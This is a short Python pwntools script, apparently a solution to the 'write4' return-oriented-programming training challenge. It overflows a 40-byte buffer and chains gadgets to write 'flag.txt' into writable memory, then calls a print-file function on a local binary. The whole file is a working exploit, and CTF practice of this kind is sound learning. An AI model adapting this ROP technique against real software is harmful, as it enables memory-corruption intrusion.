
from pwn import *
context.bits=64

printfile = p64(0x0000000000400510)
overwrite = b"A"*40
freespace= p64(0x0000000000601028)
pop2ret = p64(0x0000000000400690)
mov =p64(0x0000000000400628)
pop_rdi =p64(0x0000000000400693)

payload = overwrite + pop2ret + freespace + b"flag.txt" + mov
payload += pop_rdi + freespace + printfile

p = process("./write4")
p.send(payload)
p.interactive()


